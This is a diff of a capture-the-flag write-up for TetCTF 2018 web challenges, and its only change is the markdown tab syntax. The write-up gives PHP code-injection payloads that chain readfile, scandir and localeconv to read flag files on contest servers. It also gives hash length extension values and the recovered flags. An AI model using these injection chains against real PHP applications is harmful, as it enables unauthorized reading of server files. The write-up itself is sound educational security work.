@@ -2,8 +2,8 @@
 
 ## Web - PHPlimit Revenge
 
-{% code-tabs %}
-{% code-tabs-item title="filter.php" %}
+{% tabs %}
+{% tab title="filter.php" %}
 ```php
 <?php
 
@@ -25,15 +25,15 @@ else
 
 ?>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 I am not familiar with PHP code, but with a mindset of RE-er,...then JUST FUCKING DO IT!
 
 Btw, i joined after contest started for a while \(9 AM 4/1/2018\), so they already released the phplimit revenge 2, i just need to read which funcs are filtered by 2, and use it to create my payload
 
-{% code-tabs %}
-{% code-tabs-item title="payload1" %}
+{% tabs %}
+{% tab title="payload1" %}
 ```python
 import requests
 
@@ -45,19 +45,19 @@ print r.content
 
 #view-source:http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(ord(join(localeconv()))))))));
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="payload2" %}
+{% tabs %}
+{% tab title="payload2" %}
 ```text
 #view-source:http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(ord(join(localeconv()))))))));
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="flag" %}
+{% tabs %}
+{% tab title="flag" %}
 ```text
 <?php 
 
@@ -65,13 +65,13 @@ $fl0wer="TetCTF{_Limbo_Escaped!_Welcome_back_to_Real_Life_}";
 
 ?>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Web - PHPlimit revenge 2
 
-{% code-tabs %}
-{% code-tabs-item title="filter" %}
+{% tabs %}
+{% tab title="filter" %}
 ```php
 <?php
 
@@ -93,8 +93,8 @@ else
 
 ?>php
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 In this challenge, you couldnt use rand\(\) anymore, so to get ".", i use localeconv\(\)
 
@@ -168,16 +168,16 @@ chr(46) = '.'
 
  From now on, it is similar to  phplimit revenge 1, just read flag, final payload :
 
-{% code-tabs %}
-{% code-tabs-item title="final-payload" %}
+{% tabs %}
+{% tab title="final-payload" %}
 ```text
 view-source:http://45.76.181.81/?code=print(readfile(end(scandir(chr(octdec(ord(ceil(sqrt(ord(exp(chdir(next(scandir(current(localeconv())))))))))))))));
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="flag" %}
+{% tabs %}
+{% tab title="flag" %}
 ```text
 
 <?php
@@ -186,8 +186,8 @@ $flower="TetCTF{__Hey___PhP___Master___}";
 
 ?>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ```text
 Thanks @Ariana for teaching me thinking in multiple base/dimension
@@ -195,13 +195,13 @@ Thanks @Ariana for teaching me thinking in multiple base/dimension
 
 ## Web - IQ Test 2
 
-{% code-tabs %}
-{% code-tabs-item title="challenge.php" %}
+{% tabs %}
+{% tab title="challenge.php" %}
 ```php
 https://pastebin.com/7zdc5DNX
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 This is a challenge about hash length extension, I used this tool below to calculate saved and hash for level13
 
@@ -211,14 +211,14 @@ https://github.com/iagox86/hash_extender
 
 ![](.gitbook/assets/image%20%2865%29.png)
 
-{% code-tabs %}
-{% code-tabs-item title="payload" %}
+{% tabs %}
+{% tab title="payload" %}
 ```text
 hash: 6ac223512cea8d11c0fdf14dccbfbe62
 saved: c2VlZD10cnVlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAAAAAAAmbGV2ZWw9eGlpaQ==
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Now i have hash, have saved, so i created request with Burpsuite 
 
@@ -252,13 +252,13 @@ Check h1ddenn
 
 ![](.gitbook/assets/image%20%28195%29.png)
 
-{% code-tabs %}
-{% code-tabs-item title="flag" %}
+{% tabs %}
+{% tab title="flag" %}
 ```text
 TetCTF{__DS_Store__seems_sad__}
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 
 
